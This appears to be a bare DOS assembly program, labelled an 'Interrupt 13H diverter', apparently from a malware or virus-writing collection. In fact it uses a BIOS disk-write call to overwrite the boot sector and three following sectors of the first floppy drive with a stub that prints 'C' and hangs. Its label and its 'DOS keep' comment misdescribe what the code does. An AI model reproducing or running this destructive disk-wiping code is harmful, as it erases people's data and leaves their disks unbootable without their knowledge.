;Interrupt 13H diverter

COMSEG  SEGMENT PARA
        ASSUME  CS:COMSEG,DS:COMSEG,ES:COMSEG,SS:COMSEG

        ORG     100H

DO_START:
        mov     bx,OFFSET BOOTBUF
        mov     al,4                            ;4 sectors
        mov     ah,3                            ;write
        mov     dx,0H                           ;head 0, drive 0
        mov     cx,1H                           ;track 0, sector 1
        int     13H

        mov     ax,4C00H                        ;and do a DOS keep
        int     21H

BOOTBUF:
        mov     ah,0EH
        mov     al,'C'
        int     10H
LP:     jmp     SHORT LP
        DB      800H dup (0)

COMSEG  ENDS

        END     DO_START
        